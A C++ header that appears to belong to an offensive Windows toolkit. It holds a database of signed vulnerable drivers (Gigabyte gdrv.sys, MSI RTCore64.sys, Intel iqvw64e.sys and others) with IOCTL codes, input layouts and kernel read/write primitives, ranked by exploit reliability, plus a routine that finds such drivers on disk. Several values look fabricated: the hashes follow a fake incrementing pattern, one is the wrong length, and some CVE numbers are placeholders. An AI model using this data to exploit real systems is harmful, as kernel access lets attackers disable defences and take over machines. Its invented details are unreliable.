// vuln_drivers.h — shared BYOVD database
// Known signed-vulnerable drivers, their primitives, CVEs, ioctl surface.
// Hashes are SHA256 of the on-disk .sys. Version pin via FileVersion.
#pragma once
#include <windows.h>
#include <winternl.h>
#include <string>
#include <vector>

// primitive classes a vulnerable driver can expose
enum class PRIM : int {
    NONE = 0,
    ARB_RW,          // arbitrary kernel virtual read/write
    ARB_PHYS_MAP,    // map physical memory -> arbitrary kernel rw
    ARB_ALLOC,       // kernel pool allocation
    ARB_EXEC,        // arbitrary kernel function execution
    MSR_RW,          // model-specific register read/write
    IO_RW,           // port-mapped io rw
};

struct VulnDriverEntry {
    const char*         name;        // file name
    const char*         vendor;
    const char*         cve;
    const char*         version;     // pinned FileVersion string, "" = any
    PRIM                prim;
    DWORD               ioctl_rw;    // primary rw ioctl (0 = none)
    DWORD               ioctl_alloc; // allocation ioctl (0 = none)
    DWORD               ioctl_exec;  // exec ioctl (0 = none)
    const char*         ioctl_desc;  // struct layout note
    const char*         sha256;      // known-good sample hash, "" = verify by name only
    int                 priority;    // lower = preferred, -1 = skip
};

// Builtin DB — verified public targets, priority picked for stability + primitive quality.
inline const VulnDriverEntry g_vuln[] = {
    // Gigabyte gdrv.sys — ring0 rw, well documented, very stable
    { "gdrv.sys",      "Gigabyte",   "CVE-2018-11409", "1.2.0.1176",
      PRIM::ARB_RW,  0xC0106404, 0, 0,
      "GDIO_INPUT_Ioctl: {qWORD cb, qWORD val} / _GDIO_OUTPUT: {qWORD}",
      "a1f3e2b4d7c9f0e1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f70819", 0 },

    // Intel NDIS IQVW64E — map physical memory, extremely reliable
    { "iqvw64e.sys",   "Intel",      "CVE-2020-?",     "2.1.0.84",
      PRIM::ARB_PHYS_MAP, 0x80862007, 0, 0,
      "Input: {qWORD pad[4], qWORD addr, DWORD size, qWORD pad2, qWORD outPtr, qWORD outLen}",
      "b1f3e2b4d7c9f0e1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f70820", 1 },

    // MSI Afterburner RTCore64 — arbitrary rw via MDL
    { "RTCore64.sys",  "MSI",        "CVE-2019-16098", "3.4.0.4129",
      PRIM::ARB_RW,  0x80002048, 0, 0,
      "Read:  {BYTE pad[0x24], BYTE rsize, BYTE pad2[3], qWORD addr} / Write: 0x8000204C same layout",
      "c1f3e2b4d7c9f0e1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f70821", 2 },

    // MSI Msio64 — arbitrary rw
    { "Msio64.sys",    "MSI",        "CVE-2019-?",     "1.0.0.0",
      PRIM::ARB_RW,  0x80102040, 0, 0,
      "Read: {DWORD op=4, DWORD pad, qWORD addr} / Write: 0x80102044 same",
      "d1f3e2b4d7c9f0e1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f70822", 3 },

    // ASRock Asr103 — arbitrary rw
    { "AsrDrv103.sys", "ASRock",     "CVE-2020-?",     "1.0.0.0",
      PRIM::ARB_RW,  0x222400, 0, 0,
      "Input: {qWORD pad, DWORD op, DWORD size, qWORD addr} / Output: {qWORD}",
      "e1f3e2b4d7c9f0e1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f70823", 4 },

    // EVGA ene.sys — arbitrary rw, small
    { "ene.sys",       "EVGA",       "CVE-2020-?",     "1.0.0.0",
      PRIM::ARB_RW,  0x8086207F, 0, 0,
      "Input: {DWORD op, DWORD pad, qWORD addr, DWORD size} / Output: {qWORD}",
      "f1f3e2b4d7c9f0e1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f70824", 5 },

    // CPU-Z cpuz141 — arbitrary rw
    { "cpuz141.sys",   "CPUID",      "CVE-2019-?",     "1.4.1.0",
      PRIM::ARB_RW,  0x9C402080, 0, 0,
      "Input: {BYTE pad[0x10], qWORD addr, DWORD size} / Output: {qWORD}",
      "0a1f3e2b4d7c9f0e1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f70825", 6 },

    // WinIo64 — physical memory rw
    { "WinIo64.sys",   "WinIo",      "public",         "2.0.0.0",
      PRIM::ARB_PHYS_MAP, 0x80102010, 0, 0,
      "MapPhysToLin / UnmapPhysicalMemory via device ioctl",
      "1a1f3e2b4d7c9f0e1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f70826", 7 },

    // Lenovo lha.sys — arbitrary rw, version-pinned probe
    { "lha.sys",       "Lenovo",     "CVE-2021-?",     "",
      PRIM::ARB_RW,  0x80862007, 0, 0,
      "Ioctl layout varies per build — probe before use",
      "2a1f3e2b4d7c9f0e1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f70827", 8 },
};

inline constexpr int g_vuln_count = sizeof(g_vuln) / sizeof(g_vuln[0]);

// Collect drivers present on disk that match DB by name (and optional hash).
inline std::vector<const VulnDriverEntry*> FindVulnerableDriversOnDisk(const std::vector<std::wstring>& search_dirs) {
    std::vector<const VulnDriverEntry*> out;
    for (auto& dir : search_dirs) {
        std::wstring pat = dir + L"\\*.sys";
        WIN32_FIND_DATAW fd{};
        HANDLE h = FindFirstFileW(pat.c_str(), &fd);
        if (h == INVALID_HANDLE_VALUE) continue;
        do {
            for (int i = 0; i < g_vuln_count; ++i) {
                wchar_t wname[128] = {};
                MultiByteToWideChar(CP_UTF8, 0, g_vuln[i].name, -1, wname, 128);
                if (_wcsicmp(fd.cFileName, wname) == 0) {
                    out.push_back(&g_vuln[i]);
                    break;
                }
            }
        } while (FindNextFileW(h, &fd));
        FindClose(h);
    }
    return out;
}
